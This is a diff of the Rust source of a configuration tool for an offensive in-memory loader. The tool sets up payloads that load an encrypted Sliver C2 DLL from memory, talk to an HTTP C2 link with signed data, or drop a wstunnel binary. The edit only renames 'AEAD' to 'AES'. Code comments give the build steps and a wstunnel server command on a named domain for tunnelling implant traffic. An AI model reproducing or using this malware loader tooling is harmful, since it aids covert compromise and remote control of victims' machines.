@@ -69,7 +69,7 @@ fn main() {
         );
         ap.refer(&mut keypair).add_option(&["--keypair"], Store,"path of your private ed25519 key pair to sign configuration, default: ~/.malleable/ed25519.u8)");
         ap.refer(&mut loader_keypair).add_option(&["--keypair"], Store,"path of the loader private ed25519 key pair to send authenticated data with HTTPPostC2Link, default: ~/.malleable/config/ed25519.u8)");
-        ap.refer(&mut payload_dataope).add_option(&["--payload-dataop"], Store,"path of the payload dataoperations (needed for AEAD because it require cryptmaterial), default: ~/.malleable/payload/sliver.dll.dataop");
+        ap.refer(&mut payload_dataope).add_option(&["--payload-dataop"], Store,"path of the payload dataoperations (needed for AES because it require cryptmaterial), default: ~/.malleable/payload/sliver.dll.dataop");
         ap.refer(&mut link_timeout).add_option(&["--link-timeout"], Store,"global timeout for link");
         ap.refer(&mut link_user_agent).add_option(&["--link-user-agent"], Store,"global user-agent for link");
         ap.parse_args_or_exit();
@@ -106,7 +106,7 @@ fn main() {
             }),
         ];
     } else if payload == "dll".to_string() {
-        info!("[+] Loader type choice: DllFromMemory [AEAD]");
+        info!("[+] Loader type choice: DllFromMemory [AES]");
         let payload_dataoperation: Vec<DataOperation> =
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
@@ -120,7 +120,7 @@ fn main() {
             thread: true,
         })];
     } else if payload == "dll2".to_string() {
-        info!("[+] Loader type choice: DllFromMemory [AEAD]");
+        info!("[+] Loader type choice: DllFromMemory [AES]");
         let payload_dataoperation: Vec<DataOperation> =
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
@@ -134,7 +134,7 @@ fn main() {
             thread: true,
         })];
     } else if payload == "2dll".to_string() {
-        info!("[+] Loader type choice: DllFromMemory [AEAD]");
+        info!("[+] Loader type choice: DllFromMemory [AES]");
         let payload_dataoperation: Vec<DataOperation> =
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![
@@ -186,12 +186,12 @@ exec(decoded_script)
             }),
         ];
     } else if payload == "file".to_string() {
-        info!("[+] Loader type choice: DllFromMemory [AEAD] from file");
+        info!("[+] Loader type choice: DllFromMemory [AES] from file");
         let payload_dataoperation: Vec<DataOperation> =
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
             link: Link::FILE(FileLink {
-                file_path: String::from("C:\\dll\\malldll.dll.aead"),
+                file_path: String::from("C:\\dll\\malldll.dll.aes"),
                 dataoperation: payload_dataoperation,
                 jitt: 0,
                 sleep: 0,
@@ -200,7 +200,7 @@ exec(decoded_script)
             thread: true,
         })];
     } else if payload == "memdll".to_string() {
-        info!("[+] Loader type choice: DllFromMemory [AEAD]");
+        info!("[+] Loader type choice: DllFromMemory [AES]");
         let payload_dataoperation: Vec<DataOperation> =
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
@@ -217,11 +217,11 @@ exec(decoded_script)
         // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
         // cargo run --bin encrypt_payload ~/.malleable/payload/wstunnel.exe
         // cargo run --bin conf wstunnel --payload-dataop ~/.malleable/payload/wstunnel.exe.dataop
-        // cp ~/.malleable/payload/wstunnel.exe.aead ../config/mem1
+        // cp ~/.malleable/payload/wstunnel.exe.aes ../config/mem1
         // winrust loader --mem1 --mem2 --debug
         // root@sliver:~# ./wstunnel server --tls-certificate /etc/letsencrypt/live/sliverperso.kaboum.xyz/fullchain.pem --tls-private-key /etc/letsencrypt/live/sliverperso.kaboum.xyz/privkey.pem wss://[::]:8080
 
-        info!("[+] Loader type choice: WriteFile Wstunnel from memory [AEAD]");
+        info!("[+] Loader type choice: WriteFile Wstunnel from memory [AES]");
         let payload_dataoperation: Vec<DataOperation> =
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![
